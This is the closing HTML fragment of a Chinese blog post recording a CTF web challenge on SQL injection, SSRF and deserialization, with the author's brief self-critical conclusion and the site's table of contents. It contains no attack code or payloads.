+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>我太菜了。综合利用还是不行，说明我每个点还没都弄明白。尤其是正则表达式，只能看个大概，复杂的就不懂了，还需要继续学习</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%8A%E5%A4%A9%E5%81%9Abuuoj%E5%81%9A%E4%BA%86%E4%B8%80%E9%81%93web%E9%A2%98%EF%BC%8C%E6%80%BB%E7%9A%84%E6%9D%A5%E8%AF%B4%E8%80%83%E5%AF%9F%E5%88%B0%E4%BA%86SQL%E6%B3%A8%E5%85%A5%E3%80%81SSRF%E3%80%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9%E3%80%82%E8%BF%99%E4%B8%89%E4%B8%AA%E8%80%83%E7%82%B9%E6%88%91%E9%83%BD%E6%83%B3%E5%88%B0%E4%BA%86%EF%BC%8C%E4%BD%86%E6%98%AF%E4%B8%80%E5%9D%97%E8%80%83%E6%88%91%E6%98%AF%E6%B2%A1%E6%83%B3%E5%88%B0%E7%9A%84%E3%80%82"><span class="toc-number">1.</span> <span class="toc-text">今天做buuoj做了一道web题，总的来说考察到了SQL注入、SSRF、反序列化的知识点。这三个考点我都想到了，但是一块考我是没想到的。</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E9%93%BA%E5%9E%AB"><span class="toc-number">1.1.</span> <span class="toc-text">知识铺垫</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MYSQL-UNION-SELECT-%EF%BC%9A"><span class="toc-number">1.1.1.</span> <span class="toc-text">MYSQL UNION SELECT ：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MYSQL-CONCAT-GROUP-CONCAT"><span class="toc-number">1.1.2.</span> <span class="toc-text">MYSQL CONCAT GROUP_CONCAT</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF"><span class="toc-number">1.1.3.</span> <span class="toc-text">SSRF</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8%E4%B8%8A%E5%B8%9D%E8%A7%86%E8%A7%92%E5%86%8D%E7%9C%8B%E8%BF%99%E9%81%93%E9%A2%98"><span class="toc-number">1.3.</span> <span class="toc-text">在上帝视角再看这道题</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.</span> <span class="toc-text">总结</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://polosec.github.io/2020/04/21/20200421%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://polosec.github.io/2020/04/21/20200421%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&text=20200421学习笔记"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://polosec.github.io/2020/04/21/20200421%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=20200421学习笔记"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://polosec.github.io/2020/04/21/20200421%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&is_video=false&description=20200421学习笔记"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=20200421学习笔记&body=Check out this article: https://polosec.github.io/2020/04/21/20200421%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://polosec.github.io/2020/04/21/20200421%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=20200421学习笔记"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://polosec.github.io/2020/04/21/20200421%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=20200421学习笔记"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://polosec.github.io/2020/04/21/20200421%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=20200421学习笔记"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://polosec.github.io/2020/04/21/20200421%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=20200421学习笔记"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://polosec.github.io/2020/04/21/20200421%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&name=20200421学习笔记&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://polosec.github.io/2020/04/21/20200421%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&t=20200421学习笔记"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2021
+    Polo
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
